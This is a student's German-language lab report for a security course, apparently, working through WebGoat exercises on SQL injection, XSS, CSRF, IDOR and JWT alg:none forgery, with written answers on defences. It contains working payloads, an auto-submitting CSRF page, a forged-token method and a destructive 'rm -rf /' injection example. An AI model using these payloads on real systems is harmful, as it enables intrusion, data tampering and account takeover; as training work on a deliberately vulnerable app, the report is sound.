# KN-Webgoat-01: OWASP Top 10 – Dokumentation

**Modul:** M183 – Applikationssicherheit implementieren  
**Auftrag:** KN-Webgoat-01  
**Benutzer:** yannik  
**Datum:** Juni 2026

---

## Inhaltsverzeichnis

1. [A) WebGoat starten](#a-webgoat-starten)
2. [B) SQL Injection](#b-sql-injection)
3. [C) Cross-Site Scripting (XSS)](#c-cross-site-scripting-xss)
4. [D) CSRF – Cross-Site Request Forgery](#d-csrf--cross-site-request-forgery)
5. [E) Broken Access Control – IDOR](#e-broken-access-control--idor)
6. [F) Broken Authentication – JWT Tokens](#f-broken-authentication--jwt-tokens)
7. [Schriftliche Antworten](#schriftliche-antworten)

---

## A) WebGoat starten

### Ziel
WebGoat auf einer AWS EC2-Instanz starten und über den Browser erreichbar machen.

### Schritt 1 – Port 8080 freigeben

In der AWS Security Group `m183-sg` wurde eine Inbound Rule für Port 8080 hinzugefügt, um den Zugriff auf WebGoat zu ermöglichen.

**Screenshot – Inbound Rules der Sicherheitsgruppe m183-sg:**

![Inbound Rule Port 8080](ScreenshotderInboundRulefürPort8080.png)

Die Security Group `sg-0c769cc43d4757957` (m183-sg) zeigt drei eingehende Regeln:
- **Port 9000** – Custom TCP, Quelle: eigene IP (`194.230.148.188/32`)
- **Port 8080** – Custom TCP (für WebGoat), Quelle: eigene IP
- **Port 22** – SSH, Quelle: eigene IP

> ⚠️ Wichtig: Der Port wurde nur für die eigene IP geöffnet (`My IP`), nicht für `0.0.0.0/0`, um den Zugang auf den eigenen Rechner zu beschränken.

### Schritt 2 – WebGoat starten und aufrufen

WebGoat wurde via Docker gestartet:

```bash
docker run -d --name webgoat -p 8080:8080 webgoat/webgoat
docker ps
```

**Screenshot – WebGoat-Startseite mit EC2-IP in der URL:**

![WebGoat Startseite](ScreenshotWebGoat-StartseitemitEC2-IPinderURL.png)

Die WebGoat-Oberfläche ist unter `http://3.92.173.16:8080/WebGoat/` erreichbar. Im Browser ist die EC2-IP-Adresse (`3.92.173.16`) deutlich in der URL sichtbar. WebGoat wurde erfolgreich gestartet und ein Benutzerkonto (Benutzername: `yannik`) wurde erstellt.

---

## B) SQL Injection

### Hintergrund

SQL Injection entsteht, wenn Benutzereingaben ungefiltert in SQL-Abfragen eingebaut werden. Ein Angreifer kann damit die Datenbankabfrage strukturell verändern und z.B. Authentifizierungen umgehen oder Daten extrahieren.

**OWASP Top 10 (2021):** A03 – Injection

---

### B1 – Login Bypass (Try It! String SQL Injection)

**Aufgabe:** Alle Benutzer aus der Datenbank auslesen, ohne den genauen Nachnamen zu kennen.

**Verwendeter Payload:**

Im Feld `last_name` wurde über die Dropdown-Auswahl der Wert `Smith' OR '1'='1` zusammengesetzt:

```
Smith' OR '1'='1
```

Das ursprüngliche SQL-Statement:
```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '<eingabe>'
```

Wird durch den Payload zu:
```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1'='1'
```

Da `'1'='1'` immer `TRUE` ist, gibt die Datenbank alle Einträge zurück.

**Screenshot – Gelöste B1-Aufgabe (grüne Bestätigung + extrahierte Daten):**

![SQL Injection B1 Lösung](ScreenshotB1(grüneBestätigung+Payloadsichtbar).png)

Das Ergebnis zeigt alle Benutzer der Tabelle `user_data`:
- 101, Joe, Snow – VISA
- 102, John, Smith – MC / AMEX
- 103, Jane, Plane – MC / AMEX
- 10312, Jolly, Hershey – MC / AMEX
- 10323, Grumpy, youaretheweakestlink – MC / AMEX
- ...und weitere Einträge mit Kreditkartennummern, CC-Typ und Login-Counts

WebGoat zeigt: **«You have succeeded»** – die Aufgabe ist abgeschlossen.

---

### B2 – Query Chaining: Integrität kompromittieren

**Aufgabe:** Das eigene Gehalt via SQL Query Chaining auf den höchsten Wert setzen.

**Kontext:** Der Benutzername ist `John Smith` mit TAN `3SL99A`.

**Verwendeter Payload (im TAN-Feld):**

```sql
3SL99A'; UPDATE employees SET salary = 9999999 WHERE last_name = 'Smith'; --
```

Das ursprüngliche SQL-Statement wird durch das Semikolon `;` erweitert:
```sql
-- Original:
SELECT department FROM employees WHERE last_name = 'Smith' AND auth_tan = '3SL99A'

-- Nach Injection:
SELECT department FROM employees WHERE last_name = 'Smith' AND auth_tan = '3SL99A';
UPDATE employees SET salary = 9999999 WHERE last_name = 'Smith'; --'
```

**Screenshot – Gelöste B2-Aufgabe (Query Chaining):**

![SQL Injection B2 Lösung](ScreenshotB2(Payload+extrahierteDaten).png)

Das Ergebnis zeigt die veränderte Gehaltstabelle:
- **37648, John, Smith, Marketing, 9999999, 3SL99A** ← Gehalt auf 9.999.999 gesetzt
- 96134, Bob, Franco, Marketing, 83700
- 89762, Tobi, Barnett, Development, 77000
- ...

WebGoat bestätigt: **«Well done! Now you are earning the most money. And at the same time you successfully compromised the integrity of data by changing your salary!»**

---

## C) Cross-Site Scripting (XSS)

### Hintergrund

XSS erlaubt das Einschleusen von JavaScript-Code in Webseiten, der im Browser anderer Benutzer ausgeführt wird. Es gibt drei Typen: Reflected XSS (nur Benutzer mit manipuliertem Link betroffen), Stored XSS (Payload in DB gespeichert, alle Nutzer betroffen) und DOM-based XSS (rein clientseitig, Server sieht Payload nie).

**OWASP Top 10 (2021):** A03 – Injection (XSS war 2021 Teil von A03)

---

### C1a – Reflected XSS

**Aufgabe:** Ein Eingabefeld in WebGoat (Kreditkartennummer) auf XSS-Anfälligkeit testen.

**Verwendeter Payload:**

```html
<script>alert('Reflected XSS')</script>
```

Dieser Payload wurde in das Feld «Enter your credit card number» eingegeben.

**Screenshot – Ausgelöster Alert (Reflected XSS):**

![Reflected XSS Alert](ScreenshotC1aAlert+grüneBestätigung.png)

Der Browser zeigt den Alert-Dialog: **«Auf 54.81.121.45:8080 wird Folgendes angezeigt: Reflected XSS»**. Im Eingabefeld ist der `<script>`-Tag sichtbar. Darunter ist zu sehen, dass der normale Wert `1234` zuvor korrekt in der Seite erschienen war («We have charged credit card: 1234»).

> Hinweis: WebGoat meldete danach «Try again. We do want to see a specific JavaScript mentioned in the goal of the assignment» – der Alert wurde zwar ausgelöst, für die grüne Bestätigung musste ggf. ein spezifischer Wert verwendet werden. Der Reflected XSS selbst war jedoch erfolgreich bewiesen.

---

### C1b – Identify potential for DOM-Based XSS

**Aufgabe:** Im JavaScript-Quellcode von WebGoat die verwundbaren Stellen für DOM-based XSS identifizieren.

**Screenshot – C1b Analyse mit markierten Codezeilen:**

![DOM-based XSS Analyse](ScreenshotC1bmarkierteverwundbareCodezeilen.png)

Im DevTools-Quellcode (Datei `GoatRouter.js`) wurde nach dem Begriff `test` gesucht. Die verwundbaren Zeilen sind in der Router-Konfiguration zu finden:

```javascript
routes: {
    'welcome': 'welcomeRoute',
    'lesson/:name': 'lessonRoute',
    'lesson/:name/:pageNum': 'lessonPageRoute',
    'test': 'testRoute',           // ← verwundbar
    'reportCard': 'reportCard'
}
```

Die Route `test` mit dem Parameter `:param` verarbeitet Eingaben aus der URL und schreibt sie ohne Sanitisierung in den DOM. Die Eingabe `start.mvc#test/` wurde erfolgreich erkannt – WebGoat bestätigt: **«Correct! Now, see if you can send an exploit to that route in the next assignment.»**

**Verwundbare Konstrukte:**
- `'test': 'testRoute'` – diese Route nimmt URL-Parameter direkt und verarbeitet sie ohne Output Encoding
- Die Backbone.js-Router-Konfiguration spiegelt URL-Fragmente direkt in den DOM

---

### C2 – Stored XSS

**Aufgabe:** JavaScript-Code als Kommentar speichern, der bei jedem Seitenaufruf ausgeführt wird.

**Verwendeter Payload:**

Der Payload wurde als Kommentar in das Profilfeld von WebGoat (DOM-based XSS Aufgabe / Stored Bereich) eingegeben. Das Ziel war, die Funktion `webgoat.customjs.phoneHome()` aufzurufen:

```html
<script>webgoat.customjs.phoneHome()</script>
```

**Screenshot – Stored XSS Ergebnis mit DevTools:**

![Stored XSS Ergebnis](ScreenshotC2Alert+grüneBestätigung.png)

Im DevTools-Console-Tab ist sichtbar:
- `phoneHome invoked` – die Funktion wurde ausgeführt
- `phoneHome said {"lessonCompleted":true,"feedback":"Herzlichen Gl\\u00FCckwunsch! Sie haben diesen Auftrag erfolgreich abgeschlossen.","feedbackArgs":null,"output":"phoneHome Response is 1944653798","outputArgs":null,"assignment":"DOMCrossScripting","attemptWasMade":true}`

Der in die Seite eingetragene Kommentar von `yannik` ist in der Timeline (2026-06-12, 15:29:03) sichtbar. Die Seite gibt die `phoneHome Response` (`1944653798`) zurück, die dann als Antwort eingegeben werden muss.

WebGoat bestätigt: **«Yes, that is the correct value (note, it will be a different value each time the phoneHome endpoint is called).»**

---

## D) CSRF – Cross-Site Request Forgery

### Hintergrund

Bei CSRF wird der Browser eines eingeloggten Benutzers dazu gebracht, im Hintergrund eine Aktion auf einer fremden Webseite auszuführen – ohne dass der Benutzer es bemerkt. Der Browser sendet den Session-Cookie automatisch mit, da er zur Domain gehört.

**OWASP Top 10 (2021):** A01 – Broken Access Control (CSRF wurde 2021 aus der separaten Top-10-Liste entfernt und ist nun Teil von A01)

---

### Schritt 1 – Anfrage analysieren

Die normale Aktion in WebGoat (Review abschicken) wurde in den DevTools analysiert.

**Screenshot – DevTools Netzwerk-Analyse:**

![DevTools Netzwerk-Anfrage](ScreenshotDevToolsNetzwerk-Anfrage(URL,Methode,Parameter).png)

Die Analyse zeigt:
- **Request URL:** `http://54.81.121.45:8080/WebGoat/csrf/review`
- **Request Method:** `POST`
- **Status Code:** `200 OK`
- **Content-Type:** `application/x-www-form-urlencoded; charset=UTF-8`
- **Cookie:** `JSESSIONID=9FF54443EEF45270F452ED5A3186CAA7`

Im **Payload-Tab** sind die gesendeten Formulardaten sichtbar:
- `reviewText`: Textinhalt des Reviews
- `stars`: Bewertung (1–5)
- `validateReq`: `2aa14227b9a13d0bede0388a7fba9aa9` (Validierungstoken der Seite)

---

### Schritt 2 – csrf-attack.html erstellen

Basierend auf der analysierten Anfrage wurde folgende HTML-Datei erstellt:

**Screenshot / Inhalt der csrf-attack.html:**

![CSRF Attack HTML](Inhaltcsrf-attack.html(ScreenshotoderCode-Block).png)

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Herzlichen Glückwunsch! Sie haben gewonnen!</h1>
  <form id="csrfForm" action="http://54.81.121.45:8080/WebGoat/csrf/review" method="POST">
    <input type="hidden" name="reviewText" value="CSRF Attack!">
    <input type="hidden" name="stars" value="5">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
  </form>
  <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

Die Seite enthält ein verstecktes Formular, das beim Laden sofort via JavaScript abgesendet wird. Der Benutzer sieht nur «Herzlichen Glückwunsch! Sie haben gewonnen!».

---

### Schritt 3 – Angriff ausführen

Die Datei wurde lokal im Browser geöffnet (`file:///C:/Users/yanni/Documents/02_TB...`).

**Screenshot – Lokale CSRF-Seite im Browser:**

![CSRF Angriff lokal](ScreenshotgrüneWebGoat-Bestätigung.png)

Die Seite zeigt «Herzlichen Glückwunsch! Sie haben gewonnen!» und das Formular wurde automatisch abgesendet.

**Screenshot – WebGoat Bestätigung (CSRF erfolgreich):**

![CSRF Bestätigung WebGoat](ScreenshotgrüneWebGoat-Bestätigung_v2.png)

WebGoat zeigt die Server-Antwort:
```json
{
  "lessonCompleted": true,
  "feedback": "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
  "output": null,
  "assignment": "ForgedReviews",
  "attemptWasMade": true
}
```

In der Review-Liste ist der Eintrag `yannik / 5 stars – CSRF Attack!` sichtbar (Zeitstempel 2026-06-12, 15:39:11), was den erfolgreichen CSRF-Angriff bestätigt.

---

## E) Broken Access Control – IDOR

### Hintergrund

IDOR (Insecure Direct Object Reference) ist eine Form von Broken Access Control: Ressourcen werden über vorhersehbare IDs angesprochen, ohne dass die Applikation prüft, ob der Anfragende der berechtigte Eigentümer ist.

**OWASP Top 10 (2021):** A01 – Broken Access Control (Platz 1, da in 94% aller Applikationen gefunden)

---

### Fremdes Profil lesen

Durch Manipulation der Profil-ID in der URL wurde ein fremdes Profil aufgerufen.

**Screenshot – Fremdes Profil mit sichtbarer Profil-ID:**

![Fremdes Profil IDOR](ScreenshotfremdesProfilmitsichtbarerProfil-ID.png)

URL: `http://54.81.121.45:8080/WebGoat/IDOR/profile/2342388`

Die Server-Antwort bestätigt den erfolgreichen Zugriff auf das fremde Profil:
```json
{
  "lessonCompleted": true,
  "feedback": "Well done, you found someone else's profile",
  "feedbackArgs": null,
  "output": "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}",
  "outputArgs": null,
  "assignment": "IDORViewOtherProfile",
  "attemptWasMade": true
}
```

Das fremde Profil gehört **Buffalo Bill** (userId: 2342388, role: 3, color: brown, size: large). WebGoat bestätigt: «Well done, you found someone else's profile».

---

### Fremdes Profil verändern (PUT-Request via curl)

Das fremde Profil wurde via `curl` auf der EC2-Instanz mit einem PUT-Request verändert.

**Screenshot – curl-Befehl und WebGoat-Bestätigung:**

![IDOR curl Befehl](ScreenshotCommanderfolgreicheVeränderung+WebGoat-Bestätigung.png)

**Verwendeter curl-Befehl:**

```bash
curl -X PUT "http://localhost:8080/WebGoat/IDOR/profile/2342388" \
  -H "Cookie: JSESSIONID=F11EC000308B1AD2F56E0BBE95D6C65B" \
  -H "Content-Type: application/json" \
  -d '{"role":0,"color":"red","size":"large","name":"Buffalo Bill","userId":"2342388"}'
```

**Server-Antwort:**
```json
{
  "lessonCompleted": true,
  "feedback": "Well done, you have modified someone else's profile (as displayed below)",
  "feedbackArgs": null,
  "output": "{role=0, color=red, size=large, name=Buffalo Bill, userId=2342388}",
  "outputArgs": null,
  "assignment": "IDOREditOtherProfile",
  "attemptWasMade": true
}
```

Das Profil wurde erfolgreich geändert: `role` von 3 auf 0, `color` von brown auf red. WebGoat bestätigt: **«Well done, you have modified someone else's profile»**.

---

### Grüne Bestätigung in WebGoat (Aufgabe F-Bereich / IDOR abgeschlossen)

**Screenshot – Grüne WebGoat-Bestätigung IDOR:**

![IDOR grüne Bestätigung](ScreenshotgrüneBestätigunginWebGoatAufgabeF.png)

---

## F) Broken Authentication – JWT Tokens

### Hintergrund

JWT (JSON Web Token) besteht aus drei Base64url-kodierten Teilen: Header (Algorithmus), Payload (Nutzdaten) und Signatur. Die `alg:none`-Schwachstelle erlaubt es, die Signaturprüfung zu umgehen, wenn ein Server `"alg":"none"` akzeptiert.

**OWASP Top 10 (2021):** A07 – Identification and Authentication Failures

---

### Schritt 1 – JWT-Struktur analysieren

Der ausgegebene Token wurde auf `https://jwt.io` analysiert.

**Screenshot – jwt.io mit Original-Token:**

![JWT.io Analyse](Screenshotjwt.iomitOriginal-Token(Payload+Algorithmussichtbar).png)

**Encoded Token (Original):**
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3ODIxMzc0NDYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.S9ROOE4ER4DyKH8k-pF25yq0EUDp3ZrtmSU-BEgdPk0Kf7VwqRIFJBWcSM6bwmgJ6wyeZNV6pJYlmRCR2b-evA
```

**Decoded Header:**
```json
{
  "alg": "HS512"
}
```

**Decoded Payload:**
```json
{
  "iat": 1782137446,
  "admin": "false",
  "user": "Tom"
}
```

Der Token verwendet `HS512` als Signaturalgorithmus. Im Payload ist zu sehen:
- `user`: Tom (eingeloggter Benutzer)
- `admin`: "false" ← diesen Wert gilt es zu manipulieren
- `iat`: Ausstellungszeitpunkt (Unix-Timestamp)

Der Token ist gültig, die Signatur kann jedoch nicht ohne den geheimen Schlüssel verifiziert werden («Invalid Signature» auf jwt.io ist erwartet).

---

### Schritt 2 – alg:none Angriff

**Neuer Header** (Base64url-kodiert, kein `=` Padding):
```json
{"alg":"none"}
```
Base64url: `eyJhbGciOiJub25lIn0`

**Neuer Payload** (`admin` auf `true` gesetzt):
```json
{"iat":1782137446,"admin":"true","user":"Tom"}
```
Base64url: `eyJpYXQiOjE3ODIxMzc0NDYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ`

**Manipulierter Token** (leere Signatur, abschliessender Punkt):

**Screenshot – Vollständiger manipulierter Token:**

![Manipulierter JWT Token](VollständigermanipulierterToken(TextoderScreenshot).png)

Der Token wurde in WebGoat eingereicht (via DevTools Application → Cookies: `access_token`).

---

### Schritt 3 – Grüne Bestätigung in WebGoat

**Screenshot – Erfolgreicher JWT-Angriff:**

![JWT Bestätigung WebGoat](ScreenshotgrüneWebGoat-Bestätigung.png)

WebGoat zeigt: **«Herzlichen Glu00FCckwunsch! Sie haben diesen Auftrag erfolgreich abgeschlossen.»**  
Im Bereich «Vote for your favorite» ist zu sehen: **«Welcome back, Tom»** – der Benutzer Tom wurde erfolgreich als Admin authentifiziert und konnte die Votes zurücksetzen.

---

## Schriftliche Antworten

### B – SQL Injection

**1. SQL-Statement vor und nach dem Einschleusen:**

Vor dem Payload:
```sql
SELECT * FROM users WHERE name = 'Smith' AND password = 'eingabe'
```

Nach dem Payload `' OR '1'='1`:
```sql
SELECT * FROM users WHERE name = 'Smith' AND password = '' OR '1'='1'
```

Die Authentifizierung wird umgangen, weil `OR '1'='1'` immer `TRUE` ergibt. Die Datenbank gibt alle Zeilen zurück, und die Applikation interpretiert das als erfolgreichen Login.

**2. Prepared Statements:**

Prepared Statements (parametrisierte Abfragen) trennen SQL-Code von Benutzerdaten auf Datenbankebene. Der Platzhalter `?` wird vom Datenbankserver vorcompiliert; die Benutzereingabe wird danach nur als Datenwert eingesetzt – nie als SQL-Code interpretiert:

```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ? AND password = ?"
);
stmt.setString(1, userName);
stmt.setString(2, password);
```

Selbst wenn ein Benutzer `' OR '1'='1` eingibt, behandelt der Datenbankserver das als reinen String-Wert, nicht als SQL-Syntax.

**3. OWASP Top 10 Kategorie:**

**A03:2021 – Injection** (umfasst SQL Injection, OS Command Injection, LDAP Injection u.a.)

**4. Zwei weitere Injection-Varianten:**

- **OS Command Injection:** Benutzereingaben werden in Betriebssystembefehlen ausgeführt (z.B. `ping <input>`). Ein Angreifer kann mit `;rm -rf /` weitere Befehle anhängen und das System kompromittieren.
- **LDAP Injection:** In Verzeichnisdiensten (Active Directory) können Sonderzeichen wie `*` oder `)` in LDAP-Filtern eigeschleust werden, um Zugriffskontrollen zu umgehen oder alle Benutzer aufzulisten.

---

### C – Cross-Site Scripting (XSS)

**1. Reflected vs. Stored XSS:**

| Merkmal | Reflected XSS | Stored XSS |
|---------|---------------|------------|
| Persistenz | Kein (nur in URL/Anfrage) | Ja (in Datenbank gespeichert) |
| Reichweite | Nur wer den manipulierten Link öffnet | Alle Benutzer, die die Seite aufrufen |
| Beispiel | Phishing-Link mit Payload in URL | Kommentarfeld mit gespeichertem Script |

**2. DOM-based XSS vs. Reflected XSS:**

Bei DOM-based XSS verarbeitet JavaScript im Browser die Eingabe direkt (z.B. `location.hash`, `document.write()`), ohne dass der Payload den Server je erreicht. Serverseitige Filter sehen den Payload gar nicht und können ihn deshalb nicht blockieren. Bei Reflected XSS wird der Payload vom Server in der HTTP-Antwort zurückgespiegelt – dort kann ein serverseitiger Filter eingreifen.

**3. Output Encoding:**

Output Encoding wandelt Sonderzeichen in HTML-Entitäten um, sodass der Browser sie nicht als Code interpretiert. Beispiel:

```
Eingabe:    <script>alert('XSS')</script>
Nach Encoding: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

Der Browser zeigt den Text an, führt ihn aber nicht als Code aus.

**4. Content-Security-Policy (CSP):**

CSP ist ein HTTP-Antwortheader, der festlegt, von welchen Quellen Skripte geladen werden dürfen:

```
Content-Security-Policy: script-src 'self' https://trusted.cdn.com
```

Inline-Skripte (`<script>alert()</script>`) und fremde Quellen werden blockiert, was XSS erheblich erschwert, auch wenn ein Payload eingefügt wurde.

**5. OWASP Top 10 Kategorie:**

**A03:2021 – Injection** (XSS ist Teil dieser Kategorie seit 2021, zuvor A07:2017)

---

### D – CSRF

**1. Warum schickt der Browser den Session-Cookie mit?**

Browser senden Cookies automatisch zu ihrer Domain, unabhängig davon, von welcher Seite die Anfrage ausgelöst wird. Das ist das Grundprinzip von HTTP-Cookies. Wenn `csrf-attack.html` (lokal geöffnet) ein Formular an `54.81.121.45:8080` sendet, schickt der Browser alle für diese Domain gespeicherten Cookies (inkl. `JSESSIONID`) automatisch mit – das Opfer muss die Angreifer-Seite nicht «bewusst» besucht haben.

**2. CSRF-Token:**

Ein CSRF-Token ist ein zufälliger, geheimer Wert, der serverseitig generiert und im HTML-Formular eingebettet wird. Bei jeder sensitiven Anfrage muss er mitgeschickt und serverseitig validiert werden. Eine Angreifer-Seite kann ihn wegen der **Same-Origin-Policy** nicht aus dem HTML der legitimen Seite auslesen – sie kann also keinen gültigen Token kennen.

**3. SameSite=Strict:**

Das `SameSite=Strict`-Flag verhindert, dass der Browser den Cookie bei Cross-Site-Anfragen (also von einer anderen Origin aus) mitschickt. Wenn `csrf-attack.html` ein Formular an WebGoat sendet, würde der JSESSIONID-Cookie mit `SameSite=Strict` nicht mitgeschickt – die Anfrage landet unauthentifiziert und schlägt fehl.

**4. OWASP Top 10 Kategorie:**

**A01:2021 – Broken Access Control** (CSRF wurde 2021 aus der separaten Kategorie A8:2017 hierunter eingeordnet)

---

### E – IDOR (Broken Access Control)

**1. «Security through Obscurity» reicht nicht:**

Das Weglassen eines Links schützt eine Ressource nicht. Angreifer können IDs systematisch durchprobieren (Enumeration), Netzwerkverkehr analysieren oder Fehlermeldungen auswerten, um Ressourcen zu finden. Sicherheit muss durch **serverseitige Autorisierungsprüfung** gewährleistet werden, nicht durch Verstecken.

**2. Verhinderung von IDOR:**

Die Applikation muss bei jeder Anfrage prüfen: «Gehört diese Ressource (ID: 2342388) dem aktuell eingeloggten Benutzer?» Beispiel-Pseudocode:

```python
if request.user.id != profile.user_id:
    return 403 Forbidden
```

Nur wenn der eingeloggte Benutzer Eigentümer der Ressource ist (oder explizit berechtigt), darf der Zugriff erfolgen.

**3. Horizontale vs. vertikale Privilegienerweiterung:**

- **Horizontal:** Zugriff auf Ressourcen anderer Benutzer mit derselben Berechtigungsstufe (z.B. Profil eines anderen normalen Users lesen). ← **Dieses IDOR-Beispiel**
- **Vertikal:** Zugriff auf Ressourcen oder Funktionen einer höheren Berechtigungsstufe (z.B. normaler User greift auf Admin-Funktionen zu).

**4. OWASP Top 10 Kategorie:**

**A01:2021 – Broken Access Control** – Platz 1, da 94% aller geprüften Applikationen mindestens eine Form von Broken Access Control aufweisen. Fehlende oder fehlerhafte Zugriffskontrolle ist die häufigste und kritischste Schwachstellenkategorie.

---

### F – JWT Tokens

**1. Sicherheitsproblem alg:none:**

Wenn ein Server `"alg":"none"` akzeptiert, deaktiviert er die Signaturprüfung. Jeder Angreifer kann den Payload beliebig verändern (z.B. `"admin":"true"`) und einen Token ohne Signatur einreichen. Der Server akzeptiert ihn, weil er glaubt, keine Signaturprüfung sei konfiguriert – die Integrität des Tokens ist vollständig kompromittiert.

**2. Base64url-Kodierung ist keine Verschlüsselung:**

JWT-Payloads sind nur Base64url-kodiert – jeder kann sie trivial dekodieren. Sensible Daten (Passwörter, persönliche Informationen, interne IDs) dürfen niemals im JWT-Payload transportiert werden, da sie für jeden lesbar sind, der den Token abfängt. Für Vertraulichkeit müsste JWE (JSON Web Encryption) verwendet werden.

**3. Gegenmassnahmen gegen JWT-Angriffe:**

- **Algorithmus-Whitelist:** Server akzeptiert nur bestimmte Algorithmen (z.B. nur `HS256` oder `RS256`), niemals `none`.
- **Kurze Ablaufzeiten (exp):** Tokens sollten nach kurzer Zeit (z.B. 15 Minuten) ablaufen, um den Schaden bei Token-Diebstahl zu begrenzen.
- **Serverseitige Signaturprüfung:** Die Signatur muss immer mit dem geheimen Schlüssel verifiziert werden, bevor der Payload vertraut wird.
- **Bibliotheken verwenden:** Keine eigene JWT-Implementierung schreiben – bewährte Libraries (z.B. `java-jwt`, `PyJWT`) sind robuster gegen bekannte Angriffe.

**4. OWASP Top 10 Kategorie:**

**A07:2021 – Identification and Authentication Failures** (früher «Broken Authentication»). Diese Kategorie umfasst fehlerhafte Implementierungen von Authentifizierungs- und Session-Management-Mechanismen.

---

## Zusammenfassung der OWASP-Kategorien

| Aufgabe | Schwachstelle | OWASP Top 10 (2021) |
|---------|--------------|---------------------|
| B | SQL Injection | A03 – Injection |
| C | Cross-Site Scripting | A03 – Injection |
| D | CSRF | A01 – Broken Access Control |
| E | IDOR | A01 – Broken Access Control |
| F | JWT alg:none | A07 – Identification and Authentication Failures |

---

